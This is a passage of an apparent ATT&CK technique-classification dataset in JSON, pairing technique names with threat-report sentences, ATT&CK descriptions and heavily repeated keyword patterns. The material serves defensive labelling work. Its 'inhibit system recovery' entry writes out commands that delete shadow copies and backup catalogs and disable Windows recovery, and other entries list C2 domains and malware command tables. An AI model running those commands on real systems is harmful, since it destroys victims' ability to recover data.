      "It then uses the base64 encoding function with this alphabet to encode the data, which in the above case resulted in: D-7Ig1ngV3PkdouzP974 The Trojan then creates a string of 9 random symbols and appends the encoded ciphertext to this random string"
    ]
  },
  "system network configuration discovery command-line interface-multi": {
    "technique_names": [
      "system network configuration discovery",
      "command and scripting interpreter"
    ],
    "sentances": [
      "The command handler obtains a command identifier from the C2 server and adds 0xFFFFFF9B to this value and then uses a switch statement to determine the appropriate command to execute"
    ]
  },
  "timestomp standard application layer protocol execution through api-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "application layer protocol",
      "native api"
    ],
    "sentances": [
      "The switch statement checks for 19 cases, between 101 and 119.\u00a0(Updated to correct command IDs, thanks @mykill!)    Command ID Function  \u00a0Description   101 getInfoOSX Gathers username and OSX version and responds using the encrypted form of the following string: \u201cMac OS X \u2013 [OSX version] x64<br>\\nUser name \u2013 [username]\u201d   102 getProcessList Runs \u201cps aux\u201d to obtain a list of running processes   103 remoteShell Runs supplied command using \u201c/bin/sh\u201d   104 getInstalledAPP Gets a list of installed applications by running the command \u201cls -la /Applications\u201d   105 showBackupIosFolder Checks to see if an IOS device was backed up to the system by running the command \u201cls -la ~/Library/Application\\ Support/MobileSync/Backup/\u201d   106 downloadFileFromPath Uploads a file from a specified path   107 createFileInSystem Downloads a file, specifically provided within the C2 server\u2019s HTTP response   108 execFile Executes a specified file on the system using the NSTask:launch method   109 deletFileFromPath Deletes a specified file using the NSFileManager:removeFileAtPath method   110 takeScreenShot Takes a screenshot using the CGGetActiveDisplayList, CGDisplayCreateImage, NSImage:initWithCGImage methods"
    ]
  },
  "custom cryptographic protocol input capture-multi": {
    "technique_names": ["encrypted channel", "input capture"],
    "sentances": [
      "The keylogger will monitor for active application windows and write them to the log in the following format: <span class=\u2019keylog_process\u2019>[Application Name]</span> The keylogger will log a configurable amount of keystrokes (default 50) before sending the log to the C2 server using the following format: <span class=\u2019keylog_user_keys\u2019>[logged keystrokes]</span> The keylogger can handle logging special keys, such as return and the function keys and will report those within the log in the following format; <span class=\u2019keylog_spec_key\u2019>[special character]</span> Infrastructure The XAgentOSX sample we analyzed was configured to use the following IP address and domain names as its C2 servers: 23.227.196[.]215 apple-iclods[.]org apple-checker[.]org apple-uptoday[.]org apple-search[.]info When we analyzed this sample, the domain names that were used as backup C2 locations were not registered; therefore, these domains did not provide any links to additional infrastructure"
    ]
  },
  "phishing: spearphishing via service": [
    "The usage of LinkedIn to deliver malicious documents,",
    "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working."
  ],
  "spearphising via service-multi": {
    "technique_names": ["data encrypted for impact"],
    "sentances": [
      "Managed Defense reached out to the impacted customer\u2019s security team, who confirmed the file was received via a LinkedIn message."
    ]
  },
  "data encrypted for impact-multi": {
    "technique_names": ["data encrypted for impact"],
    "sentances": [
      "At the same time, Enc.exe will start the encryption routine and append \u201c. jcry \u201d as file extension to the encrypted file.",
      "Ryuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer.",
      "A new child process is created as \u201c tg \u200b yt \u200b ut \u200b rc \u200b ( ID) \u200b .e \u200b xe - i SM- tgytutrc \u201d, which is used to encrypt a single file on the drive"
    ]
  },
  "data encrypted for impact": [
    "The Data field is encrypted using a custom stream cipher.",
    "Once encrypted, the system information is sent in the body of an HTTP POST",
    "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)"
  ],
  "data destruction": [
    "After the encryption of file, it will delete shadow copies with the command \u201c vssadmin delete shadows /all \u201d to ensure that all the data cannot be restored easily.",
    "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)"
  ],
  "template injection": [
    "Opening document starts a template injection technique for loading the document template from the internet.",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    "remote template ",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    " template injeciton",
    "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)"
  ],
  "spearphishing-multi": {
    "technique_names": ["inhibit system recovery"],
    "sentances": [
      "It was sent to exhibitors in an email with an Excel or Word document containing macros, pretending to be from the organizer of the event.",
      "The attackers gain an initial foothold on targeted machines via phishing emails containing malicious attachments."
    ]
  },
  "inhibit system recovery": [
    "Finally the script deletes the shadow copies, in a preparation for the ransomware operations.",
    "Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>"
  ],
  "create account": [
    "They apparently create a Domain Admin account  named SQLSVC and give it the password Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit script) and then leverage that account to perform a series of commands.",
    "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection."
  ],
  "exploitation of remote services-multi": {
    "technique_names": ["remote services"],
    "sentances": [""]
  },
  "exploitation of remote services": [
    "",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    "MS##-### ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    " smb and exploit in same sentence ",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "MS\\d{2}-\\d{3}",
    "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well."
  ],
  "exploitation for client execution.-multi": {
    "technique_names": ["exploitation for client execution"],
    "sentances": [""]
  },
  "valid accounts": [
    "",
    "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)"
  ],
  "permission groups discovery": [
    "FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration",
    "",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    "net group ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    " Get-LocAdm",
    "Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions."
  ],
  "inter-process communication: dynamic data exchange": [
    "The decoy file, doc.rtf, contains an OLE object that uses Equation Editor to drop the embedded shellcode in %TEMP%",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    "OLE ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    " OLE object ",
    "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)"
  ],
  "office application startup": [
    "The decrypted shellcode is dropped as a Microsoft Word plugin WLL  into C:\\Users\\ADMINI~1\\AppData\\Roaming\\Microsoft\\Word\\STARTUP.",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
